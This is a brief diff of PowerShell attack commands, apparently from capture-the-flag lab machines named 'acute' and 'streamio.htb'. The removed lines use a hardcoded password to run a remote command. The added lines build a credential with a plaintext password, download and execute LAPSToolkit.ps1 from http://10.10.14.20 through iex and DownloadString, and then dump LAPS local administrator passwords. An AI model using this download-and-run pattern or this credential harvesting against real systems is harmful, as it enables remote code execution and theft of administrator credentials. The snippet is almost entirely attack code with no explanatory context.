@@ -1,4 +1,4 @@
-$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)
+$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
 
-invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred
+iex(new-object net.webclient).downloadstring('http://10.10.14.20/LAPSToolkit.ps1');Get-LAPSComputers -Credential $cred
